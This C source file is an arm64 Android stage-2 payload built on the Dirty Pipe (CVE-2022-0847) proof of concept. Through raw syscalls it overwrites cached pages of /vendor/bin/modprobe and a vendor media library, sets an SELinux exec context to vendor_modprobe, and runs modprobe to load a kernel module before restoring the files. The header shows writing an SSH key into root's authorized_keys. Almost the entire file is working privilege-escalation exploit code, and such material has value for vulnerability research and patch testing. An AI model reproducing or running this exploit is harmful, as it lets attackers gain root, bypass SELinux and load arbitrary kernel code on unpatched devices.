/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <android/log.h>
#include <sys/socket.h>
#include <sys/un.h>

//#define STAGE2_DEBUG_LOG

typedef unsigned long u64;

void dp();
extern u64 mysyscall(u64, ...);
extern void logerror(u64);

struct global {
#ifdef STAGE2_DEBUG_LOG
	u64 libdl_addr;
	void *(*dlopen)(const char *name, int flags);
	void *(*dlsym)(const void *handle, const char *sym);
	int (*vsnprintf)(char *buf, size_t size, const char* fmt, va_list ap);
#endif
};

int overwrite(struct global *global, int p[2], int fd, loff_t offset, const char *data, int data_size);
void lo(struct global *global, const char *p, ...);
#define INDEX "a"

u64 mypipe(int fd[2]){
	__asm__("mov x8, SYS_pipe2\n");
	return mysyscall((u64)fd, 0);
}

u64 createfile(const char *f){
	__asm__("mov x8, SYS_openat\n");
	return mysyscall(0, f, O_CREAT | O_EXCL);
}

u64 mygettid() {
	__asm__("mov x8, SYS_gettid\n");
	return mysyscall(0);
}

u64 myfcntl(int fd, int flags){
	__asm__("mov x8, SYS_fcntl\n");
	return mysyscall(fd, flags);
}

u64 myopen(const char *p, int flags){
	__asm__("mov x8, SYS_openat\n");
	return mysyscall(0, p, flags);
}
u64 mywrite(int fd, const char *p, int len){
	__asm__("mov x8, SYS_write\n");
	return mysyscall(fd, p, len);
}

u64 myread(int fd, char *p, int len){
	__asm__("mov x8, SYS_read\n");
	return mysyscall(fd, p, len);
}

u64 myclose(int fd){
	__asm__("mov x8, SYS_close\n");
	return mysyscall(fd);
}

u64 mylseek(int fd, u64 offset, u64 whence){
	__asm__("mov x8, SYS_lseek\n");
	return mysyscall(fd, offset, whence);
}

u64 mysplice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags){
	__asm__("mov x8, SYS_splice\n");
	return mysyscall(fd_in, off_in, fd_out, off_out, len, flags);
}

u64 mymmap(void *a, u64 len, int prot, int flags, int fd, off_t offset){
	__asm__("mov x8, SYS_mmap\n");
	return mysyscall((u64)a, len, prot, flags, fd, offset);
}

u64 mysocket(int af, int p, int q) {
	__asm__("mov x8, SYS_socket\n");
	return mysyscall(af, p, q);
}

u64 myconnect(int fd, struct sockaddr *a, int len) {
	__asm__("mov x8, SYS_connect\n");
	return mysyscall(fd, a, len);
}

u64 mywritev(unsigned long fd,const struct iovec *vec, unsigned long vlen){
	__asm__("mov x8, SYS_writev\n");
	return mysyscall(fd, vec, vlen);
}

u64 myexecve(const char *p, const char **argv, const char **envp) {
	__asm__("mov x8, SYS_execve\n");
	return mysyscall((u64)p, argv, envp);
}

u64 myclone(unsigned long flags, void *stack_base,
		int *parent_tid, unsigned long tls, int *child_tid) {
	__asm__("mov x8, SYS_clone\n");
	return mysyscall(flags, stack_base, parent_tid, tls, child_tid);
}

#define P_PID 1
u64 mywaitid(int idtype, u64 id, void *infop, int options, void *ru) {
	__asm__("mov x8, SYS_waitid\n");
	return mysyscall(idtype, id, infop, options, ru);
}

static void prepare_pipe(struct global *global, int p[2])
{
	if (mypipe(p)) {
	}

	const unsigned pipe_size = myfcntl(p[1], F_GETPIPE_SZ);
	char buffer[4096];

	lo(global, "pipe_size: %d\n", pipe_size);

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		mywrite(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		myread(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int overwrite(struct global *global, int p[2], int fd, loff_t offset, const char *data, int data_size) {
	if(mylseek(fd, 0, SEEK_SET) < 0){
		lo(global, "lse");
	}
	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	loff_t nbytes = mysplice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		lo(global, "spl");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		lo(global, "sho\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = mywrite(p[1], data, data_size);
	if (nbytes < 0) {
		lo(global, "wri");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		lo(global, "sho\n");
		return EXIT_FAILURE;
	}
	//lo(global, "ok");
	return 0;
}

int mystrcmp(const char *a, const char *b){
	for(; *a && *b; a++,b++){
		if(*a > *b){
			return 1;
		}else if(*b > *a){
			return -1;
		}
	}
	if(*a > *b){
		return 1;
	}else if(*b > *a){
		return -1;
	}
	return 0;
}

int mystrlen(const char *a){
	int l = 0;
	for(; a[l]; l++){}
	return l;
}

int cmpsuf(const char *a, const char *b){
	int alen = mystrlen(a);
	int blen = mystrlen(b);
	if(alen < blen){
		return 0;
	}
	return mystrcmp(a + alen - blen, b) == 0;
}

#ifdef STAGE2_DEBUG_LOG
void parse_line(const char *l, int len, struct global *global) {
	u64 addr = 0;
	for(int i = 0; l[i]; i++){
		if(l[i] == '-'){
			break;
		}else{
			addr <<= 4;
			if('0' <= l[i] && l[i] <= '9'){
				addr += l[i] - '0';
			}else if('a' <= l[i] && l[i] <= 'f'){
				addr += l[i] - 'a' + 10;
			}
		}
	}
	//logerror(*(u64*)l);
	if(global->libdl_addr == 0 && cmpsuf(l, "/system/lib64/bootstrap/libdl.so")){
		global->libdl_addr = addr;
		// Device specific
		global->dlopen = (typeof(global->dlopen))(global->libdl_addr + 0x1014);
		global->dlsym = (typeof(global->dlsym))(global->libdl_addr + 0x1044);
	}
}

int max(int a, int b){
	return a > b ? a : b;
}
int min(int a, int b){
	return a < b ? a : b;
}

void prepare_log(struct global *global) {
	int fd = myopen("/proc/self/maps", O_RDONLY);
	char linebuf[1000];
	char ch;
	int pos = 0;
	while(myread(fd, &ch, 1) > 0){
		if(ch == '\n'){
			int len = min(pos, sizeof(linebuf) - 1);
			linebuf[len] = 0;
			if(len > 0){
				parse_line(linebuf, len, global);
			}
			pos = 0;
		}else{
			if(pos < sizeof(linebuf) - 1){
				linebuf[pos] = ch;
			}
			pos++;
		}
	}
	myclose(fd);
}
#endif

void mymemcpy(char *dest, const char *src, int len){
	for(int i = 0; i < len; i++){
		dest[i] = src[i];
	}
}

void mystrcpy(char *dest, const char *src){
	mymemcpy(dest, src, mystrlen(src));
}

void mymemset(volatile char *dest, char ch, int len){
	volatile int i;
	for(i = 0; i < len; i++){
		dest[i] = ch;
	}
}

typedef struct __attribute__((__packed__)) {
  unsigned char id;
  uint16_t tid;
  unsigned long realtime;
} android_log_header_t;

void writelog(const char *buf) {
	android_log_header_t he;
	he.id = 0;
	he.tid = mygettid();
	struct iovec vec[4];
	vec[0].iov_base = (unsigned char *)&he;
	vec[0].iov_len = sizeof(he);
	vec[1].iov_base = "\x4";
	vec[1].iov_len = 1;
	vec[2].iov_base = "stage2";
	vec[2].iov_len = 7;
	vec[3].iov_base = (void *)buf;
	vec[3].iov_len = mystrlen(buf) + 1;

	int sockfd = mysocket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0);
	struct sockaddr_un addr;
	mymemset((char *)&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	mystrcpy(addr.sun_path, "/dev/socket/logdw");
	int r = myconnect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
	mywritev(sockfd, vec, 4);
	myclose(sockfd);
}

void lo(struct global *global, const char *p, ...) {
#ifdef STAGE2_DEBUG_LOG
	va_list l;
	va_start(l, p);

	char buf[201];
	mymemset(buf, 0, 201);
	global->vsnprintf(buf, 200, p, l);
	writelog(buf);

	va_end(l);
#endif
}

#define LIBMOD_PAGES 4

void c_entry() {
	const char *modprobe_path = "/vendor/bin/modprobe";
	const char *libmod_path = "/vendor/lib/libstagefright_soft_mp3dec.so";

	__asm__(".include \"include.inc\"\n");

	struct global *global = (struct global *)mymmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
	char *modprobe_backup = (char *)mymmap(0, PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
	char *libmod_backup = (char *)mymmap(0, LIBMOD_PAGES * PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);

#ifdef STAGE2_DEBUG_LOG
	prepare_log(global);

	void *libc = global->dlopen("libc.so", 0);
	global->vsnprintf = (typeof(global->vsnprintf))
		global->dlsym(libc, "vsnprintf");
#endif

#if STAGE2_DEBUG == 1
	myopen("/dev/.s2a", O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0755);
	exit(2);
#endif

	int fds = myopen(modprobe_path, O_RDONLY | O_CLOEXEC);
	int fdmod = myopen(libmod_path, O_RDONLY | O_CLOEXEC);

	myread(fds, modprobe_backup, PAGE_SIZE);
	myread(fdmod, libmod_backup, LIBMOD_PAGES * PAGE_SIZE);

	int p[2];
	prepare_pipe(global, p);

	// Calculate address of modprobe-payload + mymod.ko
	u64 next_payload = ((u64)c_entry) & ~(PAGE_SIZE-1);
	next_payload += PAGE_SIZE;

	overwrite(global, p, fds, 1, (char*)next_payload + 1, PAGE_SIZE - 1);
	for(int i = 0; i < LIBMOD_PAGES; i++){
		overwrite(global, p, fdmod, i * PAGE_SIZE + 1, (char*)next_payload + PAGE_SIZE * (i+1) + 1, PAGE_SIZE - 1);
	}

	u64 ret = myclone(SIGCHLD, NULL, NULL, 0, NULL);

	if(ret == 0){
		const char *selinux_context = "u:r:vendor_modprobe:s0";
		int fdat = myopen("/proc/self/attr/exec", O_RDWR);
		mywrite(fdat, selinux_context, mystrlen(selinux_context));
		myclose(fdat);

		const char *argv[] = {modprobe_path, libmod_path, NULL};

		myexecve(argv[0], argv, NULL);
	}else{
		lo(global, "Wait for child pid=%d\n", ret);
		u64 ret2 = mywaitid(P_PID, ret, NULL, WEXITED, NULL);
		lo(global, "waitid returned with %lu. Restore files.\n", ret2);

		overwrite(global, p, fds, 1, modprobe_backup + 1, PAGE_SIZE - 1);
		for(int i = 0; i < LIBMOD_PAGES; i++){
			overwrite(global, p, fdmod, i * PAGE_SIZE + 1, libmod_backup + PAGE_SIZE * i + 1, PAGE_SIZE - 1);
		}
	}

	__asm__("mov x8, SYS_exit\n");
	mysyscall(0);
}
